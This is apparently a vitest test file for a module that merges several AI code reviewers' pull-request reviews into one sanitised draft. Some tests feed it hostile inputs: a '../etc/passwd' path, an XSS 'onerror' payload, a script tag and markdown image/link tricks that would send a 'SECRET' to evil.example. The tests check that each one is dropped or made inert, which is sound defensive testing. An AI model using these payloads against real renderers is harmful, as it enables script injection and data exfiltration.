import {
	FACTORY_REVIEW_DRAFT_LIMITS,
	factoryReviewDraftSchema,
} from "@cline/shared";
import { describe, expect, it } from "vitest";
import {
	assembleFactoryReviewDraft,
	type FactoryPullRequestReview,
	type FactoryReviewDraftReviewer,
	factoryReviewDiffFiles,
	factoryReviewDraftStale,
	parseFactoryPullRequestReview,
} from "./factory-review-draft";

const HEAD = "0123456789abcdef0123456789abcdef01234567";
const reviewer = (
	reviewerIndex: number,
	review: Partial<FactoryPullRequestReview> = {},
): FactoryReviewDraftReviewer => ({
	reviewerIndex,
	review: {
		verdict: "approve",
		summary: "Looks fine.",
		comments: [],
		findings: [],
		questions: [],
		notChecked: [],
		...review,
	},
});
const anywhere = (path: string) => ({
	path,
	ranges: [{ start: 1, end: 10_000 }],
});
const assemble = (
	reviewers: FactoryReviewDraftReviewer[],
	files = [anywhere("src/a.ts")],
) => {
	const draft = assembleFactoryReviewDraft({ headSha: HEAD, reviewers, files });
	// Every draft is one the run state accepts.
	expect(factoryReviewDraftSchema.parse(draft)).toEqual(draft);
	return draft;
};

describe("assembleFactoryReviewDraft", () => {
	it("suggests approval only when every reviewer approved with nothing found", () => {
		expect(assemble([reviewer(0), reviewer(1)]).verdict).toBe(
			"approve_suggested",
		);
		expect(
			assemble([reviewer(0), reviewer(1, { findings: ["Rename x."] })]).verdict,
		).toBe("comment");
		expect(
			assemble([
				reviewer(0),
				reviewer(1, { verdict: "request_changes", summary: "Broken." }),
			]).verdict,
		).toBe("request_changes");
	});

	it("keeps a reviewer's whole summary in the body", () => {
		const summary = `${"The change is sound. ".repeat(60)}No blocking issue.`;
		expect(assemble([reviewer(0, { summary })]).body).toContain(
			"No blocking issue.",
		);
	});

	it("merges duplicates across reviewers at the highest severity, without attribution in the body", () => {
		const draft = assemble(
			[
				reviewer(0, {
					verdict: "request_changes",
					findings: [
						"The parser drops the last token when input ends without a newline.",
					],
					comments: [
						{
							path: "src/parser.ts",
							line: 12,
							severity: "minor",
							body: "Off-by-one: the loop stops early.",
						},
					],
					questions: ["Is empty input valid?"],
				}),
				reviewer(1, {
					verdict: "comment",
					findings: [
						"the parser drops the last token when input ends without a newline!",
						"Off-by-one: the loop stops early.",
					],
					comments: [
						{
							path: "src/parser.ts",
							line: 12,
							severity: "blocker",
							body: "Loop bound should be <= length.",
						},
					],
					questions: ["is empty input valid"],
				}),
			],
			[anywhere("src/parser.ts")],
		);
		expect(draft.comments).toEqual([
			{
				id: "c1",
				path: "src/parser.ts",
				line: 12,
				side: "RIGHT",
				severity: "blocker",
				body: "Off-by-one: the loop stops early.\n\nLoop bound should be <= length.",
				reviewers: ["Reviewer 1", "Reviewer 2"],
			},
		]);
		expect(draft.findings).toEqual([
			{
				text: "The parser drops the last token when input ends without a newline.",
				reviewers: ["Reviewer 1", "Reviewer 2"],
			},
		]);
		expect(draft.questions).toEqual(["Is empty input valid?"]);
		expect(draft.body).toContain(
			"- The parser drops the last token when input ends without a newline.",
		);
		expect(draft.body).not.toMatch(/Reviewer \d|Factory|Cline/);
	});

	it("keeps a comment inline only on a line its file's hunks cover; the rest become findings", () => {
		const diff = [
			"diff --git a/src/a.ts b/src/a.ts",
			"--- a/src/a.ts",
			"+++ b/src/a.ts",
			"@@ -8,3 +10,11 @@ export function a() {",
			"diff --git a/src/gone.ts b/src/gone.ts",
			"--- a/src/gone.ts",
			"+++ /dev/null",
			"@@ -1,4 +0,0 @@",
		].join("\n");
		const files = factoryReviewDiffFiles(diff);
		expect(files).toEqual([
			{ path: "src/a.ts", ranges: [{ start: 10, end: 20 }] },
		]);
		const draft = assemble(
			[
				reviewer(0, {
					comments: [
						{ path: "src/a.ts", line: 15, severity: "major", body: "In." },
						{ path: "src/a.ts", line: 40, severity: "minor", body: "Out." },
						{ path: "src/gone.ts", line: 1, severity: "nit", body: "Gone." },
						{ path: "../etc/passwd", line: 1, severity: "nit", body: "Up." },
						{ path: "src/a.ts", line: 0, severity: "nit", body: "Zero." },
						{ path: "src/a.ts", line: 11, severity: "nit", body: "   " },
					],
				}),
			],
			files,
		);
		expect(draft.comments.map((c) => `${c.path}:${c.line}`)).toEqual([
			"src/a.ts:15",
		]);
		expect(draft.findings.map((entry) => entry.text)).toEqual([
			"src/a.ts:40: Out.",
			"src/gone.ts:1: Gone.",
		]);
		expect(draft.dropped.map((entry) => entry.reason)).toEqual([
			"invalid_location",
			"invalid_location",
			"empty",
		]);
	});

	it("caps comments, findings and lengths, keeping the most severe comments", () => {
		const limits = FACTORY_REVIEW_DRAFT_LIMITS;
		const comments = Array.from({ length: limits.comments + 5 }, (_, i) => ({
			path: "src/a.ts",
			line: i + 1,
			severity: i < 5 ? ("nit" as const) : ("major" as const),
			body: `Distinct comment number ${i} about ${"z".repeat(i)} ${"x ".repeat(2_000)}`,
		}));
		const findings = Array.from(
			{ length: limits.bodyFindings + 10 },
			(_, i) => `Finding ${i} ${"q".repeat(i + 1)} ${"long ".repeat(400)}`,
		);
		const draft = assemble([reviewer(0, { findings, comments })]);
		expect(draft.comments).toHaveLength(limits.comments);
		expect(draft.comments.every((c) => c.severity === "major")).toBe(true);
		expect(draft.findings).toHaveLength(limits.bodyFindings);
		expect(
			draft.dropped.filter((entry) => entry.reason === "limit").length,
		).toBeGreaterThan(0);
	});

	it("makes links, images and HTML inert, and leaves mentions and references as written", () => {
		const draft = assemble([
			{
				reviewerIndex: 0,
				label: "@security-team",
				review: {
					verdict: "request_changes",
					summary: "See [details](https://evil.example) <script>x</script>",
					findings: [
						"Ping @octocat about #123 ![img](https://evil.example/i.png)",
					],
					comments: [
						{
							path: "src/a.ts",
							line: 2,
							severity: "major",
							body: "<img src=x onerror=alert(1)> fixes #9",
						},
					],
					questions: [],
					notChecked: [],
				},
			},
		]);
		const text = `${draft.body}\n${draft.comments.map((c) => `${c.body} ${c.reviewers}`).join("\n")}`;
		expect(text).toContain("Ping @octocat about #123");
		expect(text).toContain("fixes #9 @security-team");
		expect(text).not.toMatch(/(?<!\\)(?:\\\\)*(?:!\[|\]\(|<[A-Za-z/]|:\/\/)/);
	});

	it("cannot be made to fetch anything, even by comments merged on one line", () => {
		const secret = "https://evil.example/c?d=SECRET";
		const draft = assemble([
			reviewer(0, {
				comments: [
					{
						path: "src/a.ts",
						line: 3,
						severity: "major",
						body: "Looks odd here ![s]",
					},
				],
				findings: [`[t]: ${secret}`],
			}),
			reviewer(1, {
				comments: [
					{
						path: "src/a.ts",
						line: 3,
						severity: "minor",
						body: `[s]: ${secret}`,
					},
				],
				questions: ["Why ![t] here?"],
			}),
		]);
		const [comment] = draft.comments;
		expect(comment?.reviewers).toHaveLength(2);
		for (const text of [comment?.body ?? "", draft.body]) {
			// No image opener survives, and no line defines a link target.
			expect(text).not.toMatch(/(?<!\\)!\[/);
			// A label closes only at an unescaped `]`.
			expect(text).not.toMatch(/^ {0,3}(?:[-*>] *)?\[(?:[^\]\\]|\\.)*\]:/m);
		}
	});

	it("reads file headers only between a diff line and its first hunk", () => {
		const diff = [
			"diff --git a/src/a.ts b/src/a.ts",
			"--- a/src/a.ts",
			"+++ b/src/a.ts",
			"@@ -1,2 +1,4 @@",
			" const a = 1;",
			"--- a/old",
			"+++ b/src/made-up.ts",
			"+const b = 2;",
		].join("\n");
		expect(factoryReviewDiffFiles(diff)).toEqual([
			{ path: "src/a.ts", ranges: [{ start: 1, end: 4 }] },
		]);
	});

	it("records a reviewer that did not finish and drafts from the rest", () => {
		const draft = assemble([
			reviewer(0, { verdict: "comment", findings: ["Name the timeout."] }),
			{ reviewerIndex: 1, error: "Factory reviewer retry limit reached" },
		]);
		expect(draft.reviewers).toEqual([
			expect.objectContaining({ reviewerIndex: 0, verdict: "comment" }),
			{
				reviewerIndex: 1,
				label: "Reviewer 2",
				summary: "Did not finish: Factory reviewer retry limit reached",
				failed: true,
			},
		]);
		expect(draft.verdict).toBe("comment");
	});
});

describe("parseFactoryPullRequestReview", () => {
	it("accepts the reviewer's JSON and refuses anything else", () => {
		expect(
			parseFactoryPullRequestReview(
				'Done.\n```json\n{"verdict":"comment","summary":"Fine."}\n```',
			),
		).toMatchObject({ verdict: "comment", comments: [], findings: [] });
		expect(() =>
			parseFactoryPullRequestReview('{"verdict":"merge","summary":"x"}'),
		).toThrow();
		expect(() => parseFactoryPullRequestReview("Looks good to me")).toThrow();
	});
});

describe("factoryReviewDraftStale", () => {
	it("is stale when the head moved or is unknown", () => {
		const draft = { headSha: HEAD };
		expect(factoryReviewDraftStale(draft, HEAD)).toBe(false);
		expect(factoryReviewDraftStale(draft, HEAD.toUpperCase())).toBe(false);
		expect(factoryReviewDraftStale(draft, "f".repeat(40))).toBe(true);
		expect(factoryReviewDraftStale(draft, "")).toBe(true);
		expect(factoryReviewDraftStale({ headSha: "" }, HEAD)).toBe(true);
	});
});
